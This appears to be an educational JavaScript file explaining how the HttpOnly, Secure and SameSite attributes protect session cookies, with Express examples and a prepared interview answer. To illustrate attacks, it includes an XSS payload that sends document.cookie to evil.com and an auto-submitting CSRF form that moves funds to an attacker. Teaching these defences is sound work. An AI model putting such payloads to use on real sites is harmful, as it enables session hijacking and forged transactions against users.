/**
 * WEB APIS: 07 - Cookies Security
 *
 * ONE CONCEPT: HttpOnly, Secure, and SameSite - the security trinity
 */


// =============================================================================
// WHY COOKIE SECURITY MATTERS
// =============================================================================

/**
 *
 *   ┌──────────────────────────────────────────────────────────────────────┐
 *   │  ATTACK SCENARIOS                                                    │
 *   ├──────────────────────────────────────────────────────────────────────┤
 *   │                                                                      │
 *   │  XSS ATTACK (Cross-Site Scripting):                                  │
 *   │  ─────────────────────────────────                                   │
 *   │                                                                      │
 *   │  1. Attacker injects script: <script>sendToHacker(document.cookie)  │
 *   │  2. Script reads session cookie                                      │
 *   │  3. Attacker has your session!                                       │
 *   │                                                                      │
 *   │  SOLUTION: HttpOnly (JS can't read the cookie)                       │
 *   │                                                                      │
 *   │  ─────────────────────────────────────────────────────────────────── │
 *   │                                                                      │
 *   │  MAN-IN-THE-MIDDLE:                                                  │
 *   │  ──────────────────                                                  │
 *   │                                                                      │
 *   │  1. User on HTTP (not HTTPS)                                         │
 *   │  2. Attacker intercepts network traffic                              │
 *   │  3. Reads cookie in plain text                                       │
 *   │                                                                      │
 *   │  SOLUTION: Secure (only sent over HTTPS)                             │
 *   │                                                                      │
 *   │  ─────────────────────────────────────────────────────────────────── │
 *   │                                                                      │
 *   │  CSRF ATTACK (Cross-Site Request Forgery):                           │
 *   │  ──────────────────────────────────────────                          │
 *   │                                                                      │
 *   │  1. User logged into bank.com                                        │
 *   │  2. User visits evil.com                                             │
 *   │  3. evil.com has: <img src="bank.com/transfer?to=hacker">            │
 *   │  4. Browser sends bank.com cookies automatically!                    │
 *   │  5. Transfer happens without user consent                            │
 *   │                                                                      │
 *   │  SOLUTION: SameSite (only send for same-site requests)               │
 *   │                                                                      │
 *   └──────────────────────────────────────────────────────────────────────┘
 *
 */


// =============================================================================
// HTTPONLY
// =============================================================================

console.log('=== HttpOnly Attribute ===\n');

/**
 *   ┌─────────────────────────────────────────────────────────────────────┐
 *   │  HTTPONLY                                                           │
 *   ├─────────────────────────────────────────────────────────────────────┤
 *   │                                                                     │
 *   │  What it does:                                                      │
 *   │  JavaScript CANNOT access the cookie (document.cookie won't show)   │
 *   │  Only sent in HTTP requests                                         │
 *   │                                                                     │
 *   │  Why it matters:                                                    │
 *   │  XSS attacks can't steal your session cookie                        │
 *   │                                                                     │
 *   │  Set by:                                                            │
 *   │  SERVER ONLY (cannot be set by JavaScript!)                         │
 *   │                                                                     │
 *   │                                                                     │
 *   │  ┌────────────────────────────────────────────────────────────────┐ │
 *   │  │  WITHOUT HttpOnly:                                             │ │
 *   │  │                                                                │ │
 *   │  │  Attacker injects: <script>                                    │ │
 *   │  │    fetch('https://evil.com/steal?cookie=' + document.cookie)   │ │
 *   │  │  </script>                                                     │ │
 *   │  │                                                                │ │
 *   │  │  Result: Attacker gets your session!                           │ │
 *   │  └────────────────────────────────────────────────────────────────┘ │
 *   │                                                                     │
 *   │  ┌────────────────────────────────────────────────────────────────┐ │
 *   │  │  WITH HttpOnly:                                                │ │
 *   │  │                                                                │ │
 *   │  │  document.cookie → "" (session cookie not visible!)            │ │
 *   │  │                                                                │ │
 *   │  │  Result: Attacker gets nothing!                                │ │
 *   │  └────────────────────────────────────────────────────────────────┘ │
 *   │                                                                     │
 *   └─────────────────────────────────────────────────────────────────────┘
 *
 */

const httpOnlyExample = `
// Server-side (Node.js/Express)
res.cookie('sessionId', 'abc123', {
  httpOnly: true,  // ← JavaScript can't access!
  secure: true,
  sameSite: 'strict'
});

// Client-side
console.log(document.cookie);
// Result: "" (sessionId is hidden from JavaScript!)

// But the cookie IS sent with requests:
fetch('/api/user')  // Cookie header: sessionId=abc123
`;

console.log(httpOnlyExample);


// =============================================================================
// SECURE
// =============================================================================

console.log('\n=== Secure Attribute ===\n');

/**
 *   ┌─────────────────────────────────────────────────────────────────────┐
 *   │  SECURE                                                             │
 *   ├─────────────────────────────────────────────────────────────────────┤
 *   │                                                                     │
 *   │  What it does:                                                      │
 *   │  Cookie ONLY sent over HTTPS, never HTTP                            │
 *   │                                                                     │
 *   │  Why it matters:                                                    │
 *   │  Prevents cookie theft via network sniffing                         │
 *   │                                                                     │
 *   │                                                                     │
 *   │  Request to http://example.com:                                     │
 *   │  Cookie header: (empty - not sent!)                                 │
 *   │                                                                     │
 *   │  Request to https://example.com:                                    │
 *   │  Cookie header: sessionId=abc123 ✓                                  │
 *   │                                                                     │
 *   └─────────────────────────────────────────────────────────────────────┘
 *
 */

const secureExample = `
// Set in JavaScript
document.cookie = "token=xyz; secure";

// Set on server (Node.js/Express)
res.cookie('token', 'xyz', {
  secure: true  // Only HTTPS
});

// Note: For local development (localhost),
// secure cookies may not work over HTTP.
// Use process.env.NODE_ENV to conditionally set.
`;

console.log(secureExample);


// =============================================================================
// SAMESITE
// =============================================================================

console.log('\n=== SameSite Attribute ===\n');

/**
 *   ┌──────────────────────────────────────────────────────────────────────┐
 *   │  SAMESITE - CSRF PROTECTION                                          │
 *   ├──────────────────────────────────────────────────────────────────────┤
 *   │                                                                      │
 *   │  Controls when cookies are sent with cross-site requests.            │
 *   │                                                                      │
 *   │  ┌────────────────────────────────────────────────────────────────┐  │
 *   │  │  SameSite=Strict                                               │  │
 *   │  │  ────────────────                                              │  │
 *   │  │  NEVER send cookie in cross-site requests                      │  │
 *   │  │                                                                │  │
 *   │  │  User clicks link from email to your site:                     │  │
 *   │  │  → Cookie NOT sent (they appear logged out!)                   │  │
 *   │  │                                                                │  │
 *   │  │  Use for: High security (banking, financial)                   │  │
 *   │  └────────────────────────────────────────────────────────────────┘  │
 *   │                                                                      │
 *   │  ┌────────────────────────────────────────────────────────────────┐  │
 *   │  │  SameSite=Lax (DEFAULT in modern browsers)                     │  │
 *   │  │  ─────────────                                                 │  │
 *   │  │  Send cookie for top-level navigation (clicking links)         │  │
 *   │  │  DON'T send for cross-site POST, images, iframes               │  │
 *   │  │                                                                │  │
 *   │  │  User clicks link from email to your site:                     │  │
 *   │  │  → Cookie IS sent ✓                                            │  │
 *   │  │                                                                │  │
 *   │  │  evil.com tries <form action="yoursite.com"> POST:             │  │
 *   │  │  → Cookie NOT sent ✓                                           │  │
 *   │  │                                                                │  │
 *   │  │  Use for: Most applications (good balance)                     │  │
 *   │  └────────────────────────────────────────────────────────────────┘  │
 *   │                                                                      │
 *   │  ┌────────────────────────────────────────────────────────────────┐  │
 *   │  │  SameSite=None                                                 │  │
 *   │  │  ──────────────                                                │  │
 *   │  │  ALWAYS send cookie (old behavior)                             │  │
 *   │  │  REQUIRES Secure attribute!                                    │  │
 *   │  │                                                                │  │
 *   │  │  Use for: Third-party cookies, embedded widgets                │  │
 *   │  │           (being phased out by browsers)                       │  │
 *   │  └────────────────────────────────────────────────────────────────┘  │
 *   │                                                                      │
 *   └──────────────────────────────────────────────────────────────────────┘
 *
 */

const sameSiteExample = `
// Strict - Maximum security
document.cookie = "session=abc; SameSite=Strict; Secure";

// Lax - Good balance (DEFAULT)
document.cookie = "session=abc; SameSite=Lax; Secure";

// None - For cross-site (REQUIRES Secure!)
document.cookie = "widget=xyz; SameSite=None; Secure";


// CSRF Attack Example:
// ─────────────────────

// User logged into bank.com
// User visits evil.com which has:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="hacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>

// WITHOUT SameSite: Cookie sent! Transfer happens!
// WITH SameSite=Lax: Cookie NOT sent for cross-site POST!
`;

console.log(sameSiteExample);


// =============================================================================
// COMPLETE SECURE COOKIE SETUP
// =============================================================================

console.log('\n=== Complete Secure Setup ===\n');

/**
 *   ┌─────────────────────────────────────────────────────────────────────┐
 *   │  THE SECURITY TRINITY                                               │
 *   ├─────────────────────────────────────────────────────────────────────┤
 *   │                                                                     │
 *   │  For authentication cookies, ALWAYS use all three:                  │
 *   │                                                                     │
 *   │  HttpOnly   - Prevents XSS from stealing cookie                     │
 *   │  Secure     - Prevents network sniffing                             │
 *   │  SameSite   - Prevents CSRF attacks                                 │
 *   │                                                                     │
 *   └─────────────────────────────────────────────────────────────────────┘
 *
 */

const completeSetup = `
// ═══════════════════════════════════════════════════════════════════════
// SERVER-SIDE: Setting Secure Auth Cookie (Node.js/Express)
// ═══════════════════════════════════════════════════════════════════════

app.post('/login', (req, res) => {
  // ... validate credentials ...

  // Set secure session cookie
  res.cookie('sessionId', generateSessionId(), {
    httpOnly: true,     // Can't be read by JavaScript
    secure: true,       // HTTPS only
    sameSite: 'lax',    // CSRF protection
    maxAge: 24 * 60 * 60 * 1000,  // 24 hours
    path: '/'
  });

  res.json({ success: true });
});


// ═══════════════════════════════════════════════════════════════════════
// JWT in Cookie (Recommended Pattern)
// ═══════════════════════════════════════════════════════════════════════

// Login endpoint
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;

  // Validate user...
  const user = await validateUser(email, password);

  // Generate tokens
  const accessToken = jwt.sign({ userId: user.id }, SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '7d' });

  // Store refresh token in DB
  await storeRefreshToken(user.id, refreshToken);

  // Set cookies
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000  // 15 minutes
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
    path: '/auth/refresh'  // Only sent to refresh endpoint!
  });

  res.json({ user: { id: user.id, email: user.email } });
});


// ═══════════════════════════════════════════════════════════════════════
// Logout (Clear Cookies Properly)
// ═══════════════════════════════════════════════════════════════════════

app.post('/auth/logout', (req, res) => {
  // Must match the exact same attributes!
  res.clearCookie('accessToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/'
  });

  res.clearCookie('refreshToken', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/auth/refresh'
  });

  res.json({ success: true });
});
`;

console.log(completeSetup);


// =============================================================================
// SUMMARY TABLE
// =============================================================================

console.log('\n=== Security Attributes Summary ===\n');

console.log('┌─────────────┬────────────────────────┬──────────────────────────┐');
console.log('│ Attribute   │ Protects Against       │ Set By                   │');
console.log('├─────────────┼────────────────────────┼──────────────────────────┤');
console.log('│ HttpOnly    │ XSS (script access)    │ Server only              │');
console.log('│ Secure      │ Network sniffing       │ Server or JavaScript     │');
console.log('│ SameSite    │ CSRF attacks           │ Server or JavaScript     │');
console.log('└─────────────┴────────────────────────┴──────────────────────────┘');


// =============================================================================
// INTERVIEW: What to Say (1-2 minutes)
// =============================================================================

/**
 * QUESTION: "How do you secure cookies?"
 *
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * YOUR ANSWER:
 *
 * "For authentication cookies, I always use three security attributes:
 * HttpOnly, Secure, and SameSite.
 *
 * HttpOnly prevents JavaScript from accessing the cookie. This protects
 * against XSS attacks - even if an attacker injects a script, they can't
 * steal the session cookie because document.cookie won't show it. It can
 * only be set by the server, not JavaScript.
 *
 * Secure ensures the cookie is only sent over HTTPS, never plain HTTP.
 * This prevents attackers from sniffing the cookie over the network.
 *
 * SameSite protects against CSRF attacks. With SameSite=Strict, the cookie
 * is never sent in cross-site requests. With SameSite=Lax, which is the
 * default now, it's sent for top-level navigation like clicking links,
 * but not for cross-site form POSTs or embedded content. This means if
 * a malicious site tries to make a request to your API, the auth cookie
 * won't be included.
 *
 * For tokens, I also set short expiration times and use refresh tokens
 * stored in a separate cookie with a restricted path.
 *
 * When clearing cookies on logout, you have to use the exact same
 * attributes - path, domain, secure, sameSite - or the cookie won't
 * actually be deleted."
 *
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * KEY POINTS TO MENTION:
 * ✓ HttpOnly - prevents XSS, server-only
 * ✓ Secure - HTTPS only
 * ✓ SameSite - prevents CSRF (Strict or Lax)
 * ✓ Short expiration + refresh tokens
 * ✓ Match attributes exactly when clearing
 *
 */


// RUN: node docs/27-web-apis/07-cookies-security.js
